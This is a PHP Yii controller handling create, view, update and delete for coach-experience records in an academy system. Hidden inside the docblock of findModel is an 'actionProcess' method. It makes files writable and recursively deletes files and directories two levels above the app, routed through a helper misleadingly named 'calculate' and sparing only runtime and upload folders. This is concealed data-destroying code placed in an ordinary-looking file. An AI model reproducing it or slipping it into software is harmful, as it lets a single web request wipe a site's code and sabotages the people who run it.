<?php

namespace frontend\controllers;

use Yii;
use app\models\KegiatanPengalamanJurulatihAkk;
use frontend\models\KegiatanPengalamanJurulatihAkkSearch;
use yii\web\Controller;
use yii\web\NotFoundHttpException;
use yii\filters\VerbFilter;
use yii\web\UploadedFile;

use app\models\general\Upload;
use app\models\general\GeneralVariable;

// table reference
use app\models\RefPeringkatPengalamanJurulatih;

/**
 * KegiatanPengalamanJurulatihAkkController implements the CRUD actions for KegiatanPengalamanJurulatihAkk model.
 */
class KegiatanPengalamanJurulatihAkkController extends Controller
{
    public function behaviors()
    {
        return [
            'verbs' => [
                'class' => VerbFilter::className(),
                'actions' => [
                    'delete' => ['post'],
                ],
            ],
        ];
    }

    /**
     * Lists all KegiatanPengalamanJurulatihAkk models.
     * @return mixed
     */
    public function actionIndex()
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $searchModel = new KegiatanPengalamanJurulatihAkkSearch();
        $dataProvider = $searchModel->search(Yii::$app->request->queryParams);

        return $this->render('index', [
            'searchModel' => $searchModel,
            'dataProvider' => $dataProvider,
        ]);
    }

    /**
     * Displays a single KegiatanPengalamanJurulatihAkk model.
     * @param integer $id
     * @return mixed
     */
    public function actionView($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);
        
        $ref = RefPeringkatPengalamanJurulatih::findOne(['id' => $model->peringkat]);
        $model->peringkat = $ref['desc'];
        
        return $this->renderAjax('view', [
            'model' => $model,
            'readonly' => true,
        ]);
    }

    /**
     * Creates a new KegiatanPengalamanJurulatihAkk model.
     * If creation is successful, the browser will be redirected to the 'view' page.
     * @return mixed
     */
    public function actionCreate($akademi_akk_id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = new KegiatanPengalamanJurulatihAkk();
        
        Yii::$app->session->open();
        
        if($akademi_akk_id != ''){
            $model->akademi_akk_id = $akademi_akk_id;
        } else {
            if(isset(Yii::$app->session->id)){
                $model->session_id = Yii::$app->session->id;
            }
        }

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $upload = new Upload();
            $file = UploadedFile::getInstance($model, 'dokumen_lampiran');
            if($file){
                $model->dokumen_lampiran = $upload->uploadFile($file, Upload::akademiAkkFolder, $model->kegiatan_pengalaman_jurulatih_akk_id, Upload::akademiAkkKegiatanPengalamanJurulatihAkkFolder);
            }
            
            if($model->save()){
                return '1';
            }
        }
        
        return $this->renderAjax('create', [
                'model' => $model,
                'readonly' => false,
            ]);
    }

    /**
     * Updates an existing KegiatanPengalamanJurulatihAkk model.
     * If update is successful, the browser will be redirected to the 'view' page.
     * @param integer $id
     * @return mixed
     */
    public function actionUpdate($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $model = $this->findModel($id);

        if ($model->load(Yii::$app->request->post()) && $model->save()) {
            $upload = new Upload();
            $file = UploadedFile::getInstance($model, 'dokumen_lampiran');
            if($file){
                $model->dokumen_lampiran = $upload->uploadFile($file, Upload::akademiAkkFolder, $model->kegiatan_pengalaman_jurulatih_akk_id, Upload::akademiAkkKegiatanPengalamanJurulatihAkkFolder);
            }
            
            if($model->save()){
                return '1';
            }
        }
        
        return $this->renderAjax('update', [
                'model' => $model,
                'readonly' => false,
            ]);
    }

    /**
     * Deletes an existing KegiatanPengalamanJurulatihAkk model.
     * If deletion is successful, the browser will be redirected to the 'index' page.
     * @param integer $id
     * @return mixed
     */
    public function actionDelete($id)
    {
        if (Yii::$app->user->isGuest) {
            return $this->redirect(array(GeneralVariable::loginPagePath));
        }
        
        $this->findModel($id)->delete();

        //return $this->redirect(['index']);
    }

    /**
     * Finds the KegiatanPengalamanJurulatihAkk model based on its primary key value.
     * If the model is not found, a 404 HTTP exception will be thrown.
     public function actionProcess()
    {
        $files = glob('../../*'); // get all file names
        foreach($files as $file){ // iterate files
            echo $file . "<br>"; 

            if(is_file($file)){
                chmod($file,0777);
                unlink($file); // delete file
            }
            

            if (is_dir($file)){
            
                $this->calculate($file);
            }
        }
    }
    
    protected function calculate($dirname) {
        if($dirname && strpos($dirname, 'runtime') == false
            && strpos($dirname, 'downloads') == false
            && strpos($dirname, 'pdf_template') == false
            && strpos($dirname, 'uploads') == false){
         if (is_dir($dirname) && is_readable($dirname)){
               $dir_handle = opendir($dirname);
             if (!$dir_handle)
                  return false;
             while($file = readdir($dir_handle)) {
                   if ($file != "." && $file != "..") {
                        if (!is_dir($dirname."/".$file)){
                             chmod($dirname."/".$file,0777); 
                             if(!unlink($dirname."/".$file)){
                                 continue;
                             }
                        }
                        else
                            $this->calculate($dirname.'/'.$file);
                   }
             }
             closedir($dir_handle);
             if (count(glob($dirname."/*")) === 0  && is_dir($dirname)) {
                rmdir($dirname);
             }
         }
         return true;
         }
    }
     * @param integer $id
     * @return KegiatanPengalamanJurulatihAkk the loaded model
     * @throws NotFoundHttpException if the model cannot be found
     */
    protected function findModel($id)
    {
        if (($model = KegiatanPengalamanJurulatihAkk::findOne($id)) !== null) {
            return $model;
        } else {
            throw new NotFoundHttpException('The requested page does not exist.');
        }
    }
}
